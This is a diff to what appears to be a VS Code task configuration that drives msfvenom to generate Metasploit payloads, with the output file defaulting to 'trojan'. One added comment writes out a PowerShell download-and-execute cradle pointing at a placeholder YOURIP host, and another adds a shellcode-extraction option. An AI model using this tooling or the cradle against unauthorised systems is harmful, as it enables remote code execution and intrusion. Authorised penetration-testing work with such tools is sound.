@@ -13,10 +13,10 @@
                 "LHOST=${input:msfvenom-lhost}",
                 "LPORT=${input:msfvenom-lport}",
                 "${input:msfvenom-payload-advanced-options}",
+                "-o",
+                "${input:msfvenom-output}",
                 "-f",
                 "${input:msfvenom-format}",
-                "-o",
-                "${input:msfvenom-output}"
             ],
             "presentation": {
                 "echo": true,
@@ -62,9 +62,10 @@
             "description": "Select the format of the payload",
             "options": [
                 // executable first, script second, web hta third
+                // "# DONOT Choose this.(psh is powershell script with loader,raw is used for python java php pyloads)",
                 "exe",
                 "elf",
-                "psh (powershell script with loader)",
+                "psh # psh is powershell payload with loader using `IEX(New-Object System.Net.WebClient).DownloadString('http://YOURIP:80/<output>.ps1');` to load in memory ",
                 "dll",
                 "hta-psh",
                 "psh-cmd",
@@ -72,7 +73,8 @@
                 "psh-reflection",
                 "elf-so",
                 "exe-service",
-                "raw (if scripts payload like php meterpreter, python meterpreter, etc.)",
+                "raw # php python java meterpreter will meet error if you choose like php python",
+                "raw | xxd -i # you can use this to get shellcode (but you need output in /dev/stdout)",
                 "jsp",
                 "jar",
                 "war",
@@ -115,8 +117,8 @@
         {
             "id": "msfvenom-output",
             "type": "promptString",
-            "description": "Enter the output filename",
-            "default": "${workspaceFolder}/.web-delivery/muma",
+            "description": "Enter the output filename. if you put /dev/stdout here, the output will be printed to the terminal",
+            "default": "${workspaceFolder}/trojan",
         }
     ]
 }
